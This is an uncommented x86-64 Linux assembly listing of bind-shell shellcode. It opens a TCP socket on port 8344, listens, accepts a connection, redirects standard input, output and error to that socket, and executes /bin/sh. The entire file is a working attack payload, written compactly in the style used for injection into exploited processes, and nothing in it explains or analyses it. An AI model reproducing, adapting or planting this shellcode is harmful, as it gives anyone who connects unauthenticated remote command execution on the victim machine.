global _start

section .text

_start:

socket:

        push   0x29
        pop    rax
        cdq
        push   0x2
        pop    rdi
        push   0x1
        pop    rsi
        syscall

sock_struct:

        xchg   rdi,rax
        push   rdx
        mov    DWORD [rsp],0x98200002
        mov    rsi,rsp
        push   0x10
        pop    rdx

Port_Bind:

        push   0x31
        pop    rax
        syscall

Server_Listen:

        push   0x32
        pop    rax
        syscall

client_accept:

        xor    rsi,rsi
        push   0x2b
        pop    rax
        syscall

        xchg   rdi,rax
        push   0x3
        pop    rsi

dup2:

        dec    rsi
        push   0x21
        pop    rax
        syscall
        jne    dup2

Execve:

        push   0x3b
        pop    rax
        cdq
        mov rbx,0x68732f6e69622f
        push   rbx
        mov    rdi,rsp
        push   rdx
        push   rdi
        mov    rsi,rsp
        syscall
